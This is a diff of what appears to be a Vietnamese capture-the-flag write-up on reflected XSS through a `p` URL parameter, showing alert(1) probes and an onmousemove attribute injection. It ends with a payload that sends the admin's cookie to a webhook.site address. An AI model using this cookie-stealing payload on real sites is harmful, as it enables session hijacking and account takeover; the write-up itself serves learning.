@@ -18,7 +18,7 @@ Thử gán thuộc tính `p` đó cho câu lệnh `<script>alert(1)</script>` đ
 
 ![image](https://github.com/aQ05/Write-up/assets/121664384/8ed0492d-991e-4661-8f7e-d4e00a4c42e0)
 
-Khi request đến `?p=<script>alert(1)</script>`, website hiển thị trang web lỗi và có một hyperlink thẻ <a> hiển thị nội dung ‘<script>alert(1)</script>’:
+Khi request đến `?p=<script>alert(1)</script>`, website hiển thị trang web lỗi và có một hyperlink thẻ <a> hiển thị nội dung ‘<script>alert(1)</script>’. Có thể thấy web đã dính lỗi XSS:
 
 ![image](https://github.com/aQ05/Write-up/assets/121664384/a7829112-fe4b-448b-883c-a15d6248a8ab)
 
@@ -26,7 +26,7 @@ Thử nhập `?p=ayuq' onmousemove='alert(1)`, page sẽ báo lỗi và hiển t
 
 ![image](https://github.com/aQ05/Write-up/assets/121664384/a756767e-6e32-4113-975d-a5b1aad6bb02)
 
-Có thể thấy web này đã dính lỗi XSS. Khi đó, ta thực hiện gửi cookie của admin vào host của mình.
+Khi đó, ta thực hiện gửi cookie của admin vào host của mình.
 
 Payload: `ayuq' onmousemove='document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie)`
 
